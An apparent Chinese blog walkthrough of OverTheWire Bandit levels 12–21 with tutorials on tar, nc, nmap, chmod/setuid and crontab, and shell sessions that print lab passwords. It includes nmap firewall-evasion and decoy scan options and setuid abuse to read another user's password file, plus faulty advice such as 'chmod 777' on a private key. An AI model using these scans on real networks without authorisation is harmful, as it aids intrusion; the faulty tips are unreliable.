<p> <strong>tar</strong>可以为linux的文件和目录创建档案。利用tar，可以为某一特定文件创建档案（备份文件），也可以在档案中改变文件，或者向档案中加入新的文件。tar最初被用来在磁带上创建档案，现在，用户可以在任何设备上创建档案。利用tar命令，可以把一大堆的文件和目录全部打包成一个文件，这对于备份文件或将几个文件组合成为一个文件以便于网络传输是非常有用的。</p>
<p> 首先要弄清两个概念：打包和压缩。打包是指将一大堆文件或目录变成一个总的文件；压缩则是将一个大的文件通过一些压缩算法变成一个小文件。</p>
<p> 为什么要区分这两个概念呢？这源于Linux中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tar(选项)(参数)</span><br></pre></td></tr></table></figure>

<p><strong>options</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-A或--catenate：新增文件到以存在的备份文件；</span><br><span class="line">-B：设置区块大小；</span><br><span class="line">-c或--create：建立新的备份文件；</span><br><span class="line">-C &lt;目录&gt;：这个选项用在解压缩，若要在特定目录解压缩，可以使用这个选项。</span><br><span class="line">-d：记录文件的差别；</span><br><span class="line">-x或--extract或--get：从备份文件中还原文件；</span><br><span class="line">-t或--list：列出备份文件的内容；</span><br><span class="line">-z或--gzip或--ungzip：通过gzip指令处理备份文件；</span><br><span class="line">-Z或--compress或--uncompress：通过compress指令处理备份文件；</span><br><span class="line">-f&lt;备份文件&gt;或--file=&lt;备份文件&gt;：指定备份文件；</span><br><span class="line">-v或--verbose：显示指令执行过程；</span><br><span class="line">-r：添加文件到已经压缩的文件；</span><br><span class="line">-u：添加改变了和现有的文件到已经存在的压缩文件；</span><br><span class="line">-j：支持bzip2解压文件；</span><br><span class="line">-v：显示操作过程；</span><br><span class="line">-l：文件系统边界设置；</span><br><span class="line">-k：保留原有文件不覆盖；</span><br><span class="line">-m：保留文件不被覆盖；</span><br><span class="line">-w：确认压缩文件的正确性；</span><br><span class="line">-p或--same-permissions：用原来的文件权限还原文件；</span><br><span class="line">-P或--absolute-names：文件名使用绝对名称，不移除文件名称前的“/”号；</span><br><span class="line">-N &lt;日期格式&gt; 或 --newer=&lt;日期时间&gt;：只将较指定日期更新的文件保存到备份文件里；</span><br><span class="line">--exclude=&lt;范本样式&gt;：排除符合范本样式的文件。</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit12@bandit:~$ ls -al</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x  2 root     root     4096 May  7  2020 .</span><br><span class="line">drwxr-xr-x 41 root     root     4096 May  7  2020 ..</span><br><span class="line">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span><br><span class="line">-rw-r--r--  1 root     root     3526 May 15  2017 .bashrc</span><br><span class="line">-rw-r-----  1 bandit13 bandit12 2582 May  7  2020 data.txt</span><br><span class="line">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看data.txt文件后发现是二进制文件hexdump后的文件，但是该目录下我们并没有权限对该文件进行xxd操作</p>
<p>ls -al / root查看root目录下tmp文件我们具有权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit12@bandit:~$ mkdir /tmp/what_a_fuck</span><br><span class="line">bandit12@bandit:~$ cp data.txt /tmp/what_a_fuck/data.txt</span><br><span class="line">bandit12@bandit:~$ <span class="built_in">cd</span> /tmp/what_a_fuck</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ xxd -r data.txt &gt;data.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data.bin  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data.bin</span><br><span class="line">data.bin: gzip compressed data, was <span class="string">&quot;data2.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data.bin data.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data data.bz2</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d data.bz2 </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: gzip compressed data, was <span class="string">&quot;data4.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data data.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d data.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data.txt</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data</span><br><span class="line">data: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf data</span><br><span class="line">data5.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data5.bin </span><br><span class="line">data5.bin: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf  data5.bin </span><br><span class="line">data6.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data6.bin </span><br><span class="line">data6.bin: bzip2 compressed data, block size = 900k</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data6.bin fuck.bz2</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ bzip2 -d fuck.bz2 </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ ls</span><br><span class="line">data  data5.bin  data.txt  fuck</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file fuck</span><br><span class="line">fuck: POSIX tar archive (GNU)</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ tar -xvf fuck</span><br><span class="line">data8.bin</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file data8.bin </span><br><span class="line">data8.bin: gzip compressed data, was <span class="string">&quot;data9.bin&quot;</span>, last modified: Thu May  7 18:14:30 2020, max compression, from Unix</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ mv data8.bin shit.gz</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ gzip -d shit.gz </span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ file shit</span><br><span class="line">shit: ASCII text</span><br><span class="line">bandit12@bandit:/tmp/what_a_fuck$ cat shit </span><br><span class="line">The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Level-13➡Level-14"><a href="#Level-13➡Level-14" class="headerlink" title="Level_13➡Level_14"></a>Level_13➡Level_14</h2><p>用所给密钥登录bandit14账号连接到主机即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit13@bandit:~$ ls</span><br><span class="line">sshkey.private</span><br><span class="line">bandit13@bandit:~$ ssh -i sshkey.private bandit14@localhost</span><br><span class="line">bandit14@bandit:/etc$ <span class="built_in">cd</span> /etc/bandit_pass</span><br><span class="line">bandit14@bandit:/etc/bandit_pass$ cat bandit14</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br></pre></td></tr></table></figure>

<h2 id="Level-14➡Level-15"><a href="#Level-14➡Level-15" class="headerlink" title="Level_14➡Level_15"></a>Level_14➡Level_15</h2><p>Man is a good command 🙂</p>
<h2 id="Learn-about-nc"><a href="#Learn-about-nc" class="headerlink" title="Learn about nc"></a><strong>Learn about nc</strong></h2><p>NAME<br>     nc — arbitrary TCP and UDP connections and listens</p>
<p>SYNOPSIS<br>     nc [-46bCDdFhklNnrStUuvZz] [-I length] [-i interval] [-M ttl] [-m minttl] [-O length]<br>        [-P proxy_username] [-p source_port] [-q seconds] [-s source] [-T keyword] [-V rtable]<br>        [-W recvlimit] [-w timeout] [-X proxy_protocol] [-x proxy_address[:port]]<br>        [-Z peercertfile] [destination] [port]</p>
<p>DESCRIPTION<br>     The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP,<br>     or UNIX-domain sockets.  It can open TCP connections, send UDP packets, listen on arbitrary<br>     TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.  Unlike telnet(1), nc<br>     scripts nicely, and separates error messages onto standard error instead of sending them to<br>     standard output, as telnet(1) does with some.</p>
<p>Most used options</p>
<ul>
<li>-g&lt;网关&gt;：设置路由器跃程通信网关，最多设置8个;</li>
<li>-G&lt;指向器数目&gt;：设置来源路由指向器，其数值为4的倍数;</li>
<li>-h：在线帮助;</li>
<li>-i&lt;延迟秒数&gt;：设置时间间隔，以便传送信息及扫描通信端口;</li>
<li>-l：使用监听模式，监控传入的资料;</li>
<li>-n：直接使用ip地址，而不通过域名服务器;</li>
<li>-o&lt;输出文件&gt;：指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存;</li>
<li>-p&lt;通信端口&gt;：设置本地主机使用的通信端口;</li>
<li>-r：指定源端口和目的端口都进行随机的选择;</li>
<li>-s&lt;来源位址&gt;：设置本地主机送出数据包的IP地址;</li>
<li>-u：使用UDP传输协议;</li>
<li>-v：显示指令执行过程;</li>
<li>-w&lt;超时秒数&gt;：设置等待连线的时间;</li>
<li>-z：使用0输入/输出模式，只在扫描通信端口时使用。</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit14@bandit:~$ nc localhost 30000</span><br><span class="line">4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e</span><br><span class="line">Correct!</span><br><span class="line">BfMYroe26WYalil77FoDi9qh59eK5xNr</span><br></pre></td></tr></table></figure>

<h2 id="Level-15➡Level-16"><a href="#Level-15➡Level-16" class="headerlink" title="Level_15➡Level_16"></a>Level_15➡Level_16</h2><h2 id="Learn-about-openssl、s-client"><a href="#Learn-about-openssl、s-client" class="headerlink" title="Learn about openssl、s_client"></a><strong>Learn about openssl、s_client</strong></h2><pre><code>   The s_client command implements a generic SSL/TLS client which connects to a remote host
   using SSL/TLS. It is a very useful diagnostic tool for SSL servers.
</code></pre>
<p>man文档写的很详细。</p>
<p>直接连就行</p>
<p><em>openssl s_client -connect localhost:30001</em></p>
<p>输入本关flag即可</p>
<h2 id="Level-16➡Level-17"><a href="#Level-16➡Level-17" class="headerlink" title="Level_16➡Level_17"></a>Level_16➡Level_17</h2><h2 id="What’s-nmap"><a href="#What’s-nmap" class="headerlink" title="What’s nmap?"></a><strong>What’s nmap?</strong></h2><p><strong>Name</strong></p>
<p>nmap - Network exploration tool and security / port scanner</p>
<p> <strong>Synopsis</strong></p>
<p><strong>nmap</strong> [<em>Scan Type</em>…] [<em>Options</em>] {<em>target specification</em>}</p>
<p><strong>Options</strong></p>
<table>
<thead>
<tr>
<th>-sT</th>
<th>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</th>
</tr>
</thead>
<tbody><tr>
<td>-sS</td>
<td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td>
</tr>
<tr>
<td>-sF  -sN</td>
<td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td>
</tr>
<tr>
<td>-sP</td>
<td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP扫描，但UDP扫描是不可靠的</td>
</tr>
<tr>
<td>-sA</td>
<td>这项高级的扫描方法通常用来穿过防火墙的规则集</td>
</tr>
<tr>
<td>-sV</td>
<td>探测端口服务版本</td>
</tr>
<tr>
<td>-Pn</td>
<td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td>
</tr>
<tr>
<td>-v</td>
<td>显示扫描过程，推荐使用</td>
</tr>
<tr>
<td>-h</td>
<td>帮助选项，是最清楚的帮助文档</td>
</tr>
<tr>
<td>-p</td>
<td>指定端口，如“1-65535、1433、135、22、80”等</td>
</tr>
<tr>
<td>-O</td>
<td>启用远程操作系统检测，存在误报</td>
</tr>
<tr>
<td>-A</td>
<td>全面系统检测、启用脚本检测、扫描等</td>
</tr>
<tr>
<td>-oN/-oX/-oG</td>
<td>将报告写入文件，分别是正常、XML、grepable 三种格式</td>
</tr>
<tr>
<td>-T4</td>
<td>针对TCP端口禁止动态扫描延迟超过10ms</td>
</tr>
<tr>
<td>-iL</td>
<td>读取主机列表，例如，“-iL C:\ip.txt”</td>
</tr>
</tbody></table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap常用参数 </span><br><span class="line">nmap -A IP 	最常规的nmap扫描</span><br><span class="line">nmap -sP IP 	简单扫描（simple Ping）</span><br><span class="line">nmap -sS IP 	用SYN进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sT IP 	用TCP进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sU IP 	用UDP进行扫描，会向目标发一个小的包</span><br><span class="line">nmap -sI IP1 IP2 	用伪装的IP1地址去扫描目标IP2</span><br><span class="line">  	 </span><br><span class="line">nmap IP  ;   nmap -PE IP 	常规的基于ICMP ping扫描</span><br><span class="line">nmap -PP IP 	使用ICMP时间戳扫描，可以透墙</span><br><span class="line">nmap -PN IP 	IP如看似离线、宕机，尝试此参数，不用ICMP PING来进行扫描</span><br><span class="line">nmap -PS IP 	使用TCP SYN 扫描，不用ICMP</span><br><span class="line">nmap -PA IP 	使用TCP ACK 扫描，不用ICMP</span><br><span class="line">nmap -PU IP 	使用UDP 扫描，不用ICMP</span><br><span class="line">nmap -p 端口号 IP 	扫描某IP的某端口</span><br><span class="line">nmap -O IP 	扫描目的IP设备，系统检测查看OS等信息</span><br><span class="line">  	 </span><br><span class="line">  	 </span><br><span class="line">nmap -sU -sT -p U:53,T:25 172.20.6.69 	扫描172.20.6.69  的tcp25口，udp的53口</span><br><span class="line">nmap –source-port  54 172.20.6.69 	用指定的端口（如54）去扫描目标IP（172.20.6.69）</span><br><span class="line">nmap –data-length  25  172.20.6.69 	发指定长度的包去探测目标IP</span><br><span class="line">nmap –randomize-hosts 172.20.6.69-100 	随机遍历扫描172.20.6.69-100之间的IP</span><br><span class="line">  	 </span><br><span class="line">nmap -D RND:10 172.20.6.69 	—D 诱饵选项，设定n个随机虚假的地址去扫描目标地址172.20.6.69</span><br><span class="line">nmap -d 172.20.6.69 	debug模式扫描目标IP,可以看到每一步的进度</span><br><span class="line">nmap –mtu 8  172.20.6.69 	设置mtu为8 ，发很小的包给172.20.6.69进行扫描，能避免大多数的防火墙的阻拦，此值只要是8的倍数就行，如16，32,40.。。。</span><br><span class="line">nmap -F IP 	快速扫描目标IP端口，也发送很小的包给目标地址，有点类似上条  –mtu 8</span><br><span class="line">  	 </span><br><span class="line">nmap -oN  scan.txt 172.20.6.1/24 	扫描172.20.6.0网段设备，结果输出至文件sanc.txt中</span><br><span class="line">nmap -oX  scan.xml 172.20.6.1/24 	扫描172.20.6.0网段设备，结果输出至文件sanc.xml中</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV localhost -p 31000-32000</span><br></pre></td></tr></table></figure>

<p>扫出来的几个端口不多一个个试即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit16@bandit:~$ openssl s_client -connect localhost:31790 -ign_eof</span><br></pre></td></tr></table></figure>

<p>输入本关密码即可得到下一关的密钥</p>
<h2 id="Level-17➡Level-18"><a href="#Level-17➡Level-18" class="headerlink" title="Level_17➡Level_18"></a>Level_17➡Level_18</h2><p>用上一关private_key进行连接的时候注意一点，要用chmod改一下私钥权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 rsa.priv</span><br></pre></td></tr></table></figure>

<h2 id="Usage-of-diff"><a href="#Usage-of-diff" class="headerlink" title="Usage of diff"></a><strong>Usage of diff</strong></h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit17@bandit:~$ ls</span><br><span class="line">passwords.new  passwords.old</span><br><span class="line">bandit17@bandit:~$ diff passwords.old passwords.new</span><br><span class="line">42c42</span><br><span class="line">&lt; w0Yfolrc5bwjS4qw5mq1nnQi6mF03bii</span><br><span class="line">---</span><br><span class="line">&gt; kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd</span><br></pre></td></tr></table></figure>

<h2 id="Level-18➡Level-19"><a href="#Level-18➡Level-19" class="headerlink" title="Level_18➡Level_19"></a>Level_18➡Level_19</h2><p>连接到ssh后没有伪终端界面，但是我们依旧可以执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org ls -al</span><br><span class="line">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span><br><span class="line"></span><br><span class="line">bandit18@bandit.labs.overthewire.org<span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">total 24</span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root     root     4096 May  7  2020 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 41 root     root     4096 May  7  2020 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      220 May 15  2017 .bash_logout</span></span><br><span class="line"><span class="string">-rw-r-----  1 bandit19 bandit18 3549 May  7  2020 .bashrc</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root     root      675 May 15  2017 .profile</span></span><br><span class="line"><span class="string">-rw-r-----  1 bandit19 bandit18   33 May  7  2020 readme</span></span><br><span class="line"><span class="string">ubuntu@ubuntu:~$ ssh -p2220 bandit18@bandit.labs.overthewire.org cat readme</span></span><br><span class="line"><span class="string">This is a OverTheWire game server. More information on http://www.overthewire.org/wargames</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">bandit18@bandit.labs.overthewire.org&#x27;</span>s password: </span><br><span class="line">IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x</span><br></pre></td></tr></table></figure>

<p>OR us  Options:  -T:禁止分配伪终端                虽然没有伪终端，但这时我们依旧可以使用shell</p>
<h2 id="Level-19➡Level-20"><a href="#Level-19➡Level-20" class="headerlink" title="Level_19➡Level_20"></a>Level_19➡Level_20</h2><h2 id="Learn-about-chmod-and-setuid"><a href="#Learn-about-chmod-and-setuid" class="headerlink" title="Learn about chmod and setuid:"></a><strong>Learn about chmod and setuid:</strong></h2><p>chmod:(change mode）控制用户对文件的权限的命令</p>
<p>Linux/Unix 的文件调用权限分为三级 : 文件所有者（Owner）、用户组（Group）、其它用户（Other Users）。</p>
<p><img src="https://i.loli.net/2021/04/21/YSLunpTbOdlBr8M.jpg" alt="file-permissions-rwx.jpg"></p>
<p>只有文件所有者和超级用户可以修改文件或目录的权限。可以使用绝对模式（八进制数字模式），符号模式指定文件的权限。</p>
<p><img src="https://i.loli.net/2021/04/21/NJEzA2aiuWtwfL7.png" alt="rwx-standard-unix-permission-bits.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod [-cfvR] [--<span class="built_in">help</span>] [--version] mode file...</span><br></pre></td></tr></table></figure>

<p>Options:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[ugoa...][[+-&#x3D;][rwxX]...][,...]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>u 表示该文件的拥有者，g 表示与该文件的拥有者属于同一个群体(group)者，o 表示其他以外的人，a 表示这三者皆是。</p>
</li>
<li><p>+ 表示增加权限、- 表示取消权限、= 表示唯一设定权限。</p>
</li>
<li><p>r 表示可读取，w 表示可写入，x 表示可执行，X 表示只有当该文件是个子目录或者该文件已经被设定过为可执行。</p>
<p>符号模式</p>
<p>使用符号模式可以设置多个项目：who（用户类型），operator（操作符）和  permission（权限），每个项目的设置可以用逗号隔开。 命令 chmod 将修改 who  指定的用户类型对文件的访问权限，用户类型由一个或者多个字母在 who 的位置来说明，如 who 的符号模式表所示:</p>
<table>
<thead>
<tr>
<th>who</th>
<th>用户类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>u</code></td>
<td>user</td>
<td>文件所有者</td>
</tr>
<tr>
<td><code>g</code></td>
<td>group</td>
<td>文件所有者所在组</td>
</tr>
<tr>
<td><code>o</code></td>
<td>others</td>
<td>所有其他用户</td>
</tr>
<tr>
<td><code>a</code></td>
<td>all</td>
<td>所用用户, 相当于 <em>ugo</em></td>
</tr>
</tbody></table>
</li>
</ul>
<p>operator 的符号模式表:</p>
<table>
<thead>
<tr>
<th>Operator</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>+</code></td>
<td>为指定的用户类型增加权限</td>
</tr>
<tr>
<td><code>-</code></td>
<td>去除指定用户类型的权限</td>
</tr>
<tr>
<td><code>=</code></td>
<td>设置指定用户权限的设置，即将用户类型的所有权限重新设置</td>
</tr>
</tbody></table>
<p>permission 的符号模式表:</p>
<table>
<thead>
<tr>
<th>模式</th>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>r</code></td>
<td>读</td>
<td>设置为可读权限</td>
</tr>
<tr>
<td><code>w</code></td>
<td>写</td>
<td>设置为可写权限</td>
</tr>
<tr>
<td><code>x</code></td>
<td>执行权限</td>
<td>设置为可执行权限</td>
</tr>
<tr>
<td><code>X</code></td>
<td>特殊执行权限</td>
<td>只有当文件为目录文件，或者其他类型的用户有可执行权限时，才将文件权限设置可执行</td>
</tr>
<tr>
<td><code>s</code></td>
<td>setuid/gid</td>
<td>当文件被执行时，根据who参数指定的用户类型设置文件的setuid或者setgid权限</td>
</tr>
<tr>
<td><code>t</code></td>
<td>粘贴位</td>
<td>设置粘贴位，只有超级用户可以设置该位，只有文件所有者u可以使用该位</td>
</tr>
</tbody></table>
<h3 id="八进制语法"><a href="#八进制语法" class="headerlink" title="八进制语法"></a>八进制语法</h3><p>chmod命令可以使用八进制数来指定权限。文件或目录的权限位是由9个权限位来控制，每三位为一组，它们分别是文件所有者（User）的读、写、执行，用户组（Group）的读、写、执行以及其它用户（Other）的读、写、执行。历史上，文件权限被放在一个比特掩码中，掩码中指定的比特位设为1，用来说明一个类具有相应的优先级。</p>
<table>
<thead>
<tr>
<th>#</th>
<th>权限</th>
<th>rwx</th>
<th>二进制</th>
</tr>
</thead>
<tbody><tr>
<td>7</td>
<td>读 + 写 + 执行</td>
<td>rwx</td>
<td>111</td>
</tr>
<tr>
<td>6</td>
<td>读 + 写</td>
<td>rw-</td>
<td>110</td>
</tr>
<tr>
<td>5</td>
<td>读 + 执行</td>
<td>r-x</td>
<td>101</td>
</tr>
<tr>
<td>4</td>
<td>只读</td>
<td>r–</td>
<td>100</td>
</tr>
<tr>
<td>3</td>
<td>写 + 执行</td>
<td>-wx</td>
<td>011</td>
</tr>
<tr>
<td>2</td>
<td>只写</td>
<td>-w-</td>
<td>010</td>
</tr>
<tr>
<td>1</td>
<td>只执行</td>
<td>–x</td>
<td>001</td>
</tr>
<tr>
<td>0</td>
<td>无</td>
<td>—</td>
<td>000</td>
</tr>
</tbody></table>
<p>Demo: chmod 765</p>
<ul>
<li>所有者的权限用数字表达：属主的那三个权限位的数字加起来的总和。如 rwx ，也就是 4+2+1 ，应该是 7。</li>
<li>用户组的权限用数字表达：属组的那个权限位数字的相加的总和。如 rw- ，也就是 4+2+0 ，应该是 6。</li>
<li>其它用户的权限数字表达：其它用户权限位的数字相加的总和。如 r-x ，也就是 4+0+1 ，应该是 5。</li>
</ul>
<p>Demo:</p>
<p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod ugo+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 设为所有人皆可读取 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod a+r file1.txt</span><br></pre></td></tr></table></figure>

<p>将文件 file1.txt 与 file2.txt 设为该文件拥有者，与其所属同一个群体者可写入，但其他以外的人则不可写入 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod ug+w,o-w file1.txt file2.txt</span><br></pre></td></tr></table></figure>

<p>为 ex1.py 文件拥有者增加可执行权限:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod u+x ex1.py</span><br></pre></td></tr></table></figure>

<p>将目前目录下的所有文件与子目录皆设为任何人可读取 :</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod -R a+r *</span><br></pre></td></tr></table></figure>

<p>setuid:</p>
<p>SUID 特殊权限仅适用于可执行文件，所具有的功能是，只要用户对设有 SUID 的文件有执行权限，那么当用户执行此文件时，会以文件所有者的身份去执行此文件，一旦文件执行结束，身份的切换也随之消失。</p>
<p>所以我们以bandit20身份cat flag即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bandit19@bandit:~$ ./bandit20-do </span><br><span class="line">Run a <span class="built_in">command</span> as another user.</span><br><span class="line">  Example: ./bandit20-do id</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do id</span><br><span class="line">uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)</span><br><span class="line">bandit19@bandit:~$ cat /etc/bandit_pass/bandit20</span><br><span class="line">cat: /etc/bandit_pass/bandit20: Permission denied</span><br><span class="line">bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure>

<h2 id="Level-20➡Level-21"><a href="#Level-20➡Level-21" class="headerlink" title="Level_20➡Level_21"></a>Level_20➡Level_21</h2><p>其实就是开启多个shell窗口用nc在同一个端口下通信:</p>
<p><strong>Terminal 1 (host):</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bandit20@melinda:~$ nc -nvlp 44444</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 44444)</span><br><span class="line">GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br><span class="line">gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr   &#x2F;&#x2F;get flag</span><br></pre></td></tr></table></figure>

<p><strong>Terminal 2 (client):</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bandit20@melinda:~$ .&#x2F;suconnect 44444</span><br><span class="line">Read: GbKksEFF4yrVs6il55v6gwY5aVje5f0j</span><br></pre></td></tr></table></figure>

<h2 id="Level-21➡Level-22"><a href="#Level-21➡Level-22" class="headerlink" title="Level_21➡Level_22"></a>Level_21➡Level_22</h2><h2 id="Learn-about-crontab"><a href="#Learn-about-crontab" class="headerlink" title="Learn about crontab:"></a><strong>Learn about crontab:</strong></h2><p><code>crontab</code>是一个可以根据时间、日期、月份、星期的组合调度对重复任务的执行的守护进程。</p>
<p><code>crontab</code>文件中，每一行代表一个任务；每行有六列，每列代表一项设置，前五列为时间频率设定，第六列是要执行的任务。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">minute hour day mouth week command  #分 时 日 月 周 命令</span><br></pre></td></tr></table></figure>

<p><code>minute</code>表示分钟，可以是0<del>59的任意整数。<br> <code>hour</code>表示小时，可以是2</del>23的任意整数<br> <code>day</code>表示日期，可以是1<del>31的任意整数<br> <code>month</code>表示月份，可以是1</del>12的任意整数<br> <code>week</code>表示星期几，可以是0~7之间的整数，0或者7表示星期天<br> <code>command</code>表示执行的命令</p>
<p>上面的设置除了数字之外还可以使用特殊字符：<br> 星号<code>*</code>：表示所有可能的值，可以理解每隔。<br> 逗号<code>,</code>：用逗号隔开的值表示一个列表范围，如1,2,3 * * * *每天每小时的第一、第二、第三分钟。<br> 中杠<code>-</code>：用中杠隔开的值表示一个数值范围，如1-10 * * * *每天每小时的1到10分钟。<br> 正斜线<code>/</code>：指定执行任务的间隔频率，如 0 10-18/2 * * *每天的十点到十八点间隔2小时执行。</p>
<p>Demo:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 每分钟执行一次</span></span><br><span class="line">* * * * * </span><br><span class="line"><span class="meta">#</span><span class="bash"> 每小时的第3和第15分钟执行</span></span><br><span class="line">3,15 * * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">在上午的8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">在每隔2天的上午8点和11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 */2 * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每个星期一的上午8点到11点的第3和第15分钟执行</span></span><br><span class="line">3,15 8-11 * * 1</span><br><span class="line"><span class="meta">#</span><span class="bash">每晚的21：30执行</span></span><br><span class="line">30 21 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每月1、10、22日的4:30执行</span></span><br><span class="line">30 4 1,10,22 * *</span><br><span class="line"><span class="meta">#</span><span class="bash">每周六、日1:10执行</span></span><br><span class="line">10 1 * * 6,7</span><br><span class="line"><span class="meta">#</span><span class="bash">每天18:00到23:00之间每隔30分钟执行</span></span><br><span class="line">0/30 18-23 * * *</span><br><span class="line"><span class="meta">#</span><span class="bash">星期六的23:00执行</span></span><br><span class="line">0 23 * * 6</span><br><span class="line"><span class="meta">#</span><span 